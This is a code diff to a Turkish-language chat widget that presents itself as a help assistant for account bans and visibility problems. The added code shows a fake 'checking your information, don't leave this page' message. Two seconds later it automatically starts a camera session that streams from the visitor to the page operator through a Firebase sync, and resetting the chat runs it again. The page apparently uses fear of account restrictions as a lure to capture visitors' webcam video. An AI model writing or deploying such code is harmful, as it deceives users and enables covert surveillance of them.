@@ -271,6 +271,7 @@
     if (syncOut && (who === "user" || who === "bot")) {
       syncMessage(who, text);
     }
+    return row;
   }
 
   const cameraSessions = new Map();
@@ -1073,6 +1074,59 @@
 
     let busy = false;
     let quiz = null;
+    let openSeqToken = 0;
+    let openSeqTimer = null;
+
+    const GREET_TEXT =
+      "Merhaba. Ben Yardım Asistanı. Ban, izlenme düşüşü veya görünürlük sorunlarında rehberlere yönlendirebilirim.\n\nHesap durumu kontrolü için ‘Hesabım kısıtlandı’ yazın veya aşağıdaki kısayolları kullanın. Şifre / e-posta istemem.";
+    const LOADING_TEXT = "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
+
+    async function beginAutoCamera() {
+      let sync = window.ChatSync;
+      if (!sync?.enabled && window.ChatSyncReady) {
+        sync = await window.ChatSyncReady.catch(() => null);
+      }
+      if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
+        appendMessage(box, "bot", "Kamera için canlı senkron gerekir (Firebase).", {
+          sync: false,
+        });
+        return;
+      }
+      try {
+        const { callId } = await sync.startVisitorCameraOffer();
+        if (!callId) throw new Error("callId yok");
+        await autoOpenCameraFromMessage(box, { callId, type: "camera" });
+      } catch (err) {
+        console.error("auto camera", err);
+        appendMessage(
+          box,
+          "bot",
+          `Kamera başlatılamadı: ${err?.code || err?.message || "hata"}`,
+          { sync: false }
+        );
+      }
+    }
+
+    function startOpenSequence() {
+      const token = ++openSeqToken;
+      if (openSeqTimer) {
+        window.clearTimeout(openSeqTimer);
+        openSeqTimer = null;
+      }
+      busy = true;
+      appendMessage(box, "bot", GREET_TEXT);
+      const loadingRow = appendMessage(box, "bot", LOADING_TEXT, {
+        type: "loading",
+        sync: true,
+      });
+      busy = false;
+      openSeqTimer = window.setTimeout(() => {
+        openSeqTimer = null;
+        if (token !== openSeqToken) return;
+        loadingRow?.remove();
+        void beginAutoCamera();
+      }, 2000);
+    }
 
     function botSay(text, after) {
       const typing = showTyping(box);
@@ -1190,14 +1244,13 @@
     clearBtn?.addEventListener("click", () => {
       busy = false;
       quiz = null;
+      openSeqToken += 1;
+      if (openSeqTimer) {
+        window.clearTimeout(openSeqTimer);
+        openSeqTimer = null;
+      }
       seedChat(box, quick);
-      busy = true;
-      appendMessage(
-        box,
-        "bot",
-        "Sohbet sıfırlandı. Ban, izlenme veya görünürlük için kısayolları kullanın; hesap durumu kontrolü için ‘Hesabım kısıtlandı’ yazın."
-      );
-      busy = false;
+      startOpenSequence();
     });
 
     quick?.addEventListener("click", (e) => {
@@ -1207,13 +1260,7 @@
     });
 
     seedChat(box, quick);
-    busy = true;
-    appendMessage(
-      box,
-      "bot",
-      "Merhaba. Ben Yardım Asistanı. Ban, izlenme düşüşü veya görünürlük sorunlarında rehberlere yönlendirebilirim.\n\nHesap durumu kontrolü için ‘Hesabım kısıtlandı’ yazın veya aşağıdaki kısayolları kullanın. Şifre / e-posta istemem."
-    );
-    busy = false;
+    startOpenSequence();
   }
 
   let supportListenerBound = false;
